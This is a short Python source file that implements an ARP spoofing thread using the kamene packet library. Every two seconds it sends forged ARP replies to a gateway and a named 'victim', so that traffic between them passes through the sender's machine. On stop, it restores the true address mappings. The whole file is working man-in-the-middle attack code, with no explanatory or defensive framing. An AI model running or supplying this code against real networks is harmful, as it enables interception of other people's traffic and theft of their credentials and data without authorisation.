from threading import Thread
import time

from HMGeneric.internetProtocol import ArpObj

from kamene.all import send
from kamene.layers.l2 import ARP

class ArpThread(Thread):
    def __init__(self, gateway, victim):
        Thread.__init__(self)

        self.name = 'Arp posion thread'
        self.gateway : ArpObj = gateway
        self.victim : ArpObj = victim
        self.status = False
    
    def run(self):
        self.status = True
        while(self.status):
            send(ARP(op=2, pdst=self.gateway.IPAddress, hwdst=self.gateway.MACAddress, psrc=self.victim.IPAddress), verbose = False)
            send(ARP(op=2, pdst=self.victim.IPAddress, hwdst=self.victim.MACAddress, psrc=self.gateway.IPAddress), verbose=False)
            time.sleep(2)
        self.restore_network()
    
    def stop_posion(self):
        self.status = False
    
    def restore_network(self):
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.gateway.IPAddress, hwsrc=self.victim.MACAddress, psrc=self.victim.IPAddress), count=5, verbose=False)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=self.victim.IPAddress, hwsrc=self.gateway.MACAddress, psrc=self.gateway.IPAddress), count=5, verbose=False)